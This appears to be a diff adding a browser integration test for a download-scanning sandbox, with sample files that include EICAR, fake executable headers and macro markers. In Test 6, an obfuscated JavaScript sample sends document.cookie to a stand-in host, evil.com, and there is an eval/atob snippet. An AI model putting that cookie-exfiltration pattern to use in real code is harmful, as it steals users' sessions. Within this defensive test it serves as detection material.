@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<script src="../include.js"></script>
+<script>
+test(() => {
+    println("=== Sentinel Sandbox Download Scanning Integration Test ===");
+    println("");
+
+    // Test 1: Clean file (low threat score)
+    println("Test 1: Clean file download");
+    try {
+        const cleanContent = "This is a clean text file with no malicious content.";
+        const cleanBlob = new Blob([cleanContent], { type: 'text/plain' });
+        const cleanUrl = URL.createObjectURL(cleanBlob);
+
+        const cleanLink = document.createElement('a');
+        cleanLink.href = cleanUrl;
+        cleanLink.download = 'clean.txt';
+        document.body.appendChild(cleanLink);
+        cleanLink.click();
+        document.body.removeChild(cleanLink);
+
+        URL.revokeObjectURL(cleanUrl);
+        println("  ✓ Clean file download initiated");
+        println("  Expected: Low threat score, no sandbox execution");
+    } catch (e) {
+        println("  ✗ Error: " + e.message);
+    }
+    println("");
+
+    // Test 2: Suspicious file (medium threat score)
+    println("Test 2: Suspicious file download");
+    try {
+        // File with patterns that might trigger YARA rules but aren't critical
+        const suspiciousContent =
+            "MZ\x90\x00" + // PE header signature
+            "This file contains suspicious patterns but may be legitimate.\n" +
+            "eval(someCode);\n" +
+            "document.write('<script>alert(1)</script>');\n";
+
+        const suspiciousBlob = new Blob([suspiciousContent], { type: 'application/octet-stream' });
+        const suspiciousUrl = URL.createObjectURL(suspiciousBlob);
+
+        const suspiciousLink = document.createElement('a');
+        suspiciousLink.href = suspiciousUrl;
+        suspiciousLink.download = 'suspicious.bin';
+        document.body.appendChild(suspiciousLink);
+        suspiciousLink.click();
+        document.body.removeChild(suspiciousLink);
+
+        URL.revokeObjectURL(suspiciousUrl);
+        println("  ✓ Suspicious file download initiated");
+        println("  Expected: Medium threat score, Tier 1 WASM sandbox execution");
+    } catch (e) {
+        println("  ✗ Error: " + e.message);
+    }
+    println("");
+
+    // Test 3: Malicious file (high threat score with EICAR pattern)
+    println("Test 3: Malicious file download (EICAR test pattern)");
+    try {
+        // EICAR test virus signature - safe for testing
+        const eicarContent = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
+
+        const maliciousBlob = new Blob([eicarContent], { type: 'application/octet-stream' });
+        const maliciousUrl = URL.createObjectURL(maliciousBlob);
+
+        const maliciousLink = document.createElement('a');
+        maliciousLink.href = maliciousUrl;
+        maliciousLink.download = 'eicar.com';
+        document.body.appendChild(maliciousLink);
+        maliciousLink.click();
+        document.body.removeChild(maliciousLink);
+
+        URL.revokeObjectURL(maliciousUrl);
+        println("  ✓ Malicious file download initiated");
+        println("  Expected: High threat score, full sandbox analysis, quarantine");
+    } catch (e) {
+        println("  ✗ Error: " + e.message);
+    }
+    println("");
+
+    // Test 4: Large file handling (tests size-based scanning logic)
+    println("Test 4: Large file download");
+    try {
+        // Create a 1MB file (within small file threshold)
+        const largeSize = 1024 * 1024; // 1 MB
+        const largeContent = new Uint8Array(largeSize);
+
+        // Fill with recognizable pattern
+        for (let i = 0; i < largeSize; i++) {
+            largeContent[i] = i % 256;
+        }
+
+        const largeBlob = new Blob([largeContent], { type: 'application/octet-stream' });
+        const largeUrl = URL.createObjectURL(largeBlob);
+
+        const largeLink = document.createElement('a');
+        largeLink.href = largeUrl;
+        largeLink.download = 'large.bin';
+        document.body.appendChild(largeLink);
+        largeLink.click();
+        document.body.removeChild(largeLink);
+
+        URL.revokeObjectURL(largeUrl);
+        println("  ✓ Large file download initiated (1MB)");
+        println("  Expected: Size-appropriate scanning strategy");
+    } catch (e) {
+        println("  ✗ Error: " + e.message);
+    }
+    println("");
+
+    // Test 5: Binary executable with suspicious headers
+    println("Test 5: Binary executable download");
+    try {
+        // Minimal PE/ELF-like header structure
+        const executableContent = new Uint8Array([
+            0x4D, 0x5A, // MZ signature (PE)
+            0x90, 0x00, 0x03, 0x00, 0x00, 0x00,
+            0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF,
+            // Add some "suspicious" strings in the binary
+            ...new TextEncoder().encode("cmd.exe"),
+            0x00, 0x00, 0x00,
+            ...new TextEncoder().encode("powershell"),
+            0x00, 0x00, 0x00,
+            ...new TextEncoder().encode("registry"),
+        ]);
+
+        const execBlob = new Blob([executableContent], { type: 'application/x-msdownload' });
+        const execUrl = URL.createObjectURL(execBlob);
+
+        const execLink = document.createElement('a');
+        execLink.href = execUrl;
+        execLink.download = 'suspicious.exe';
+        document.body.appendChild(execLink);
+        execLink.click();
+        document.body.removeChild(execLink);
+
+        URL.revokeObjectURL(execUrl);
+        println("  ✓ Executable file download initiated");
+        println("  Expected: High priority scan, behavioral analysis");
+    } catch (e) {
+        println("  ✗ Error: " + e.message);
+    }
+    println("");
+
+    // Test 6: Script file with obfuscated content
+    println("Test 6: JavaScript file with obfuscation");
+    try {
+        const obfuscatedScript = `
+// Potentially malicious obfuscated JavaScript
+var _0x1234 = ['document', 'cookie', 'location', 'href'];
+function evil() {
+    var x = window[_0x1234[0]][_0x1234[1]];
+    window[_0x1234[2]][_0x1234[3]] = 'http://evil.com/?data=' + x;
+}
+eval(atob('YWxlcnQoMSk=')); // base64: alert(1)
+`;
+
+        const scriptBlob = new Blob([obfuscatedScript], { type: 'application/javascript' });
+        const scriptUrl = URL.createObjectURL(scriptBlob);
+
+        const scriptLink = document.createElement('a');
+        scriptLink.href = scriptUrl;
+        scriptLink.download = 'obfuscated.js';
+        document.body.appendChild(scriptLink);
+        scriptLink.click();
+        document.body.removeChild(scriptLink);
+
+        URL.revokeObjectURL(scriptUrl);
+        println("  ✓ Obfuscated script download initiated");
+        println("  Expected: Script analysis, obfuscation detection");
+    } catch (e) {
+        println("  ✗ Error: " + e.message);
+    }
+    println("");
+
+    // Test 7: Archive file (potential for nested threats)
+    println("Test 7: Archive file download");
+    try {
+        // Minimal ZIP file structure (PK header)
+        const zipContent = new Uint8Array([
+            0x50, 0x4B, 0x03, 0x04, // PK signature
+            0x14, 0x00, 0x00, 0x00, 0x08, 0x00,
+            ...new TextEncoder().encode("nested_file.txt"),
+        ]);
+
+        const zipBlob = new Blob([zipContent], { type: 'application/zip' });
+        const zipUrl = URL.createObjectURL(zipBlob);
+
+        const zipLink = document.createElement('a');
+        zipLink.href = zipUrl;
+        zipLink.download = 'archive.zip';
+        document.body.appendChild(zipLink);
+        zipLink.click();
+        document.body.removeChild(zipLink);
+
+        URL.revokeObjectURL(zipUrl);
+        println("  ✓ Archive file download initiated");
+        println("  Expected: Archive inspection, nested file analysis");
+    } catch (e) {
+        println("  ✗ Error: " + e.message);
+    }
+    println("");
+
+    // Test 8: Document with macro indicators
+    println("Test 8: Office document download");
+    try {
+        const docContent = new Uint8Array([
+            0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1, // OLE signature
+            ...new TextEncoder().encode("VBA"),
+            0x00, 0x00,
+            ...new TextEncoder().encode("AutoOpen"),
+            0x00, 0x00,
+            ...new TextEncoder().encode("Macro"),
+        ]);
+
+        const docBlob = new Blob([docContent], { type: 'application/vnd.ms-office' });
+        const docUrl = URL.createObjectURL(docBlob);
+
+        const docLink = document.createElement('a');
+        docLink.href = docUrl;
+        docLink.download = 'document.doc';
+        document.body.appendChild(docLink);
+        docLink.click();
+        document.body.removeChild(docLink);
+
+        URL.revokeObjectURL(docUrl);
+        println("  ✓ Office document download initiated");
+        println("  Expected: Macro detection, sandbox execution if present");
+    } catch (e) {
+        println("  ✗ Error: " + e.message);
+    }
+    println("");
+
+    // Summary
+    println("=== Test Summary ===");
+    println("All download scenarios initiated successfully.");
+    println("");
+    println("Expected Flow:");
+    println("1. RequestServer receives download request");
+    println("2. SecurityTap intercepts and computes SHA256");
+    println("3. Orchestrator performs static analysis (YARA + ML)");
+    println("4. If suspicious: WasmExecutor runs Tier 1 sandbox");
+    println("5. If still suspicious: Native Tier 2 sandbox (if enabled)");
+    println("6. VerdictEngine generates final threat assessment");
+    println("7. User receives alert via IPC (for threats)");
+    println("8. PolicyGraph caches verdict for future lookups");
+    println("");
+    println("Note: Actual scanning occurs in RequestServer/Sentinel processes.");
+    println("This test verifies download initiation; verdicts logged to console.");
+});
+</script>
